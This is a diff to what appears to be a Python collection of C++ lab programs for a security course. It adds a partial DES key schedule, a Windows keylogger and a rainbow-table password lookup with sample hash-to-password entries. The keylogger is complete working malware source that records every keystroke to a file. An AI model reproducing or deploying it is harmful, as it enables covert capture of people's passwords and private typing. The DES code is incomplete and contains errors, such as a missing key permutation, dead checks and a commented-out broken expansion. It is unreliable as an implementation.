@@ -415,7 +415,193 @@ int main() {
 '''
 
 des = '''
-!UNDER CONSTRUCTION!
+
+#include <iostream>
+#include <bitset>
+#include <string>
+using namespace std;
+
+bitset<56> bitReduction(const bitset<64>& key) {
+    bitset<56> reducedKey;
+    int j = 0;
+    for (int i = 0; i < 64; ++i) {
+        if ((i + 1) % 8 != 0) {
+            reducedKey[j++] = key[i];
+        }
+    }
+    return reducedKey;
+}
+
+bitset<64> leftShift2(const bitset<64>& data) {
+    return (data << 2) | (data >> (64 - 2));
+}
+
+bitset<28> leftShift(const bitset<28>& keyPart, int round) {
+    int shiftAmount = (round == 1 || round == 9 || round == 16) ? 1 : 2;
+    return (keyPart << shiftAmount) | (keyPart >> (28 - shiftAmount));
+}
+
+int main() {
+    // Get user input for data string
+    string dataInput;
+    cout << "Enter 64-bit Data String: ";
+    cin >> dataInput;
+    bitset<64> dataString(dataInput);
+
+    string firstPart = dataInput.substr(0, 32);
+    string secondPart = dataInput.substr(32, 64);
+
+    cout << "L0 bits of Data: " << firstPart << endl;
+    cout << "R0 bits of Data: " << secondPart << endl;
+
+   /* bitset<48> ExpandedR0(secondPart) {
+    int a=0;
+    for(int e=0,)
+    }
+*/
+
+    // Get user input for key string
+    string keyInput;
+    cout << "Enter 64-bit Key String: ";
+    cin >> keyInput;
+    bitset<64> keyString(keyInput);
+
+    // Perform bit reduction on the key
+    bitset<56> reducedKey = bitReduction(keyString);
+
+    // Split the reduced key into left and right parts
+    bitset<28> leftPart(reducedKey.to_string().substr(0, 28));
+    bitset<28> rightPart(reducedKey.to_string().substr(28, 28));
+
+    // Print original input data, shifted input data, input key, and reduced input key
+    cout << "Original Input Data: " << dataString << endl;
+    cout << "Shifted Input Data: " << leftShift2(dataString) << endl;
+    cout << "Input Key: " << keyString << endl;
+    cout << "Reduced Input Key: " << reducedKey << endl;
+
+    // Print left and right parts of the reduced key
+    cout << "Left Part of Reduced Key: " << leftPart << endl;
+    cout << "Right Part of Reduced Key: " << rightPart << endl;
+
+    // Perform left shift on left and right parts based on round
+    for (int round = 1; round <= 16; ++round) {
+        // Shift left and right parts
+        leftPart = leftShift(leftPart, round);
+        rightPart = leftShift(rightPart, round);
+
+        // Print shifted left and right parts
+        cout << "Round " << round << " Shifted Left Part: " << leftPart << endl;
+        cout << "Round " << round << " Shifted Right Part: " << rightPart << endl;
+
+        if(round==0){
+            cout<< round<<"ROUND 1 "<< endl;
+        }
+
+        // Form new key by adding shifted left and right parts of previous round
+        bitset<56> newKey = (leftPart.to_ullong() << 28) | rightPart.to_ullong();
+
+        // Print new key formed
+        cout << "Round " << round << " New Key Formed: " << newKey << endl;
+
+        // Divide the new key into left and right parts for the next round
+        //leftPart = newKey.to_string().substr(0, 28);
+        //rightPart = newKey.to_string().substr(28, 28);
+    }
+
+    return 0;
+}
+'''
+
+keylogger = '''
+#include <iostream>
+#include <fstream>
+#include <windows.h>
+#include <winuser.h>
+using namespace std;
+
+void logKeystrokes() {
+    char key;
+    for (;;) {
+        for (key = 8; key <= 190; ++key) {
+            if (GetAsyncKeyState(key) == -32767) {
+                ofstream outFile("keylog.txt", ios::app);
+                if (outFile) {
+                    outFile << key;
+                    outFile.close();
+                }
+            }
+        }
+    }
+}
+
+int main() {
+    logKeystrokes();
+    return 0;
+}
+
+
+
+'''
+
+rainbow_table = ''' 
+#include <iostream>
+#include <fstream>
+#include <string>
+using namespace std;
+
+void searchHash(const string& fileName, const string& passHash) {
+    ifstream inFile(fileName);
+    if (!inFile) {
+        cerr << "Unable to open file";
+        return;
+    }
+
+    string line;
+    while (getline(inFile, line)) {
+        size_t pos = line.find(passHash);
+        if (pos != string::npos) {
+            cout << "Password found:" << endl;
+            cout << line << endl;
+            inFile.close();
+            return;
+        }
+    }
+
+    cout << "Password not found." << endl;
+    inFile.close();
+}
+
+int main() {
+    string fileName = "rainbow.txt";
+    string passHash;
+
+    cout << "Enter the password hash: ";
+    cin >> passHash;
+
+    searchHash(fileName, passHash);
+
+    cout << "Press Enter to exit";
+    cin.ignore();
+    cin.get();
+    return 0;
+}
+
+
+MD5:dc06698f0e2e75751545455899adccc3:pass@123
+SHA1:ba97b1cf397425a852d1316d10787b1d97b5bc85:pass@123
+SHA256:d97086919b6522e13ba9b46c04902c38372102218a4b3ef2f45ac2a80e9fd240:pass@123
+
+MD5:5f4dcc3b5aa765d61d8327deb882cf99:password
+SHA1:5baa61e4c9b93f3f0682250b6cf8331b7ee68fd8:password
+SHA256:5e884898da28047151d0e56f8dc6292773603d0d6aabbdd62a11ef721d1542d8:password
+
+MD5:d8578edf8458ce06fbc5bb76a58c5ca4:qwerty
+SHA1:b1b3773a05c0ed0176787a4f1574ff0075f7521e:qwerty
+SHA256:65e84be33532fb784c48129675f9eff3a682b27168c0ea744b2cf58ee02337c5:qwerty
+
+MD5:6119442a08276dbb22e918c3d85c1c6e:incorrect
+SHA1:6c03ac0ea7241c3b2e2b7d54ff1db5f5539dc198:incorrect
+SHA256:203d3536bd62ad33ac70b7ea3d4f5e10b6d52ebd0cb7582841a053aebb7186a3:incorrect
 '''
 
 iss_codes = {
@@ -425,6 +611,8 @@ iss_codes = {
     "diffie_hellman.cpp": diffie_hellman,
     "rsa.cpp": rsa,
     'des.cpp': des,
+    'keylogger.cpp': keylogger,
+    'rainbow_table.cpp': rainbow_table
 }
 
 def iss_():
